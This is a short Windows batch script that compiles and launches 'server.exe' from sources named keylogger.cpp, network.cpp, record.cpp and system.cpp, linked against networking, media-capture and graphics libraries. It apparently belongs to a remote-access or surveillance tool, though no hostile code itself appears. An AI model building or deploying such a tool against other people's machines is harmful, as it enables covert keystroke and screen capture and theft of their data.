@echo off
REM ----------------------------
REM Compile server.cpp + src/*.cpp
REM Link with required Windows libraries
REM ----------------------------

set COMPILER=g++
set SOURCES=server.cpp src\keylogger.cpp src\network.cpp src\utils.cpp src\record.cpp src\system.cpp
set OUTPUT=server.exe

REM List of libraries to link
set LIBS=-lshlwapi -lshell32 -lws2_32 -lmf -lmfplat -lmfreadwrite -lmfuuid -lole32 -loleaut32 -lrpcrt4 -lgdiplus -lgdi32 -luser32

echo Compiling...
%COMPILER% %SOURCES% -o %OUTPUT% %LIBS%

if %errorlevel% neq 0 (
    echo Compilation failed.
    pause
    exit /b %errorlevel%
)

echo Compilation successful.
echo Run Server:
server.exe
pause
